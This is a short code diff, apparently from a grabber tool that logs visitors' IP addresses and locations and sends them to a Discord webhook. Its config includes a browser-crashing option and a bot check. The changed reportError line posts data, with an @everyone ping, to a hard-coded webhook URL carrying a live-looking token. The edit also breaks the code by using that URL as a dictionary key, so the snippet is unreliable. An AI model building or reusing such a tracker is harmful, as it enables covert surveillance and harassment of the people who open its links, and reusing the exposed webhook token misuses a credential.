@@ -18,7 +18,7 @@ config = {
     "color": 0x00FFFF,
 
     "crashBrowser": True, 
-    "accurateLocation": True,
+    "accurateLocation": False,
 
     "message": {
         "doMessage": False, 
@@ -56,7 +56,7 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json = {
+    requests.post(config["https://discord.com/api/webhooks/1436260820547014689/55tWmNNhTcRwKcbjOB3o1lTZ1JsEFEeg2VYIe75VuVTSXqpjpHfjLyxGF3ysn6XtuYDR"], json = {
     "username": config["username"],
     "content": "@everyone",
     "embeds": [
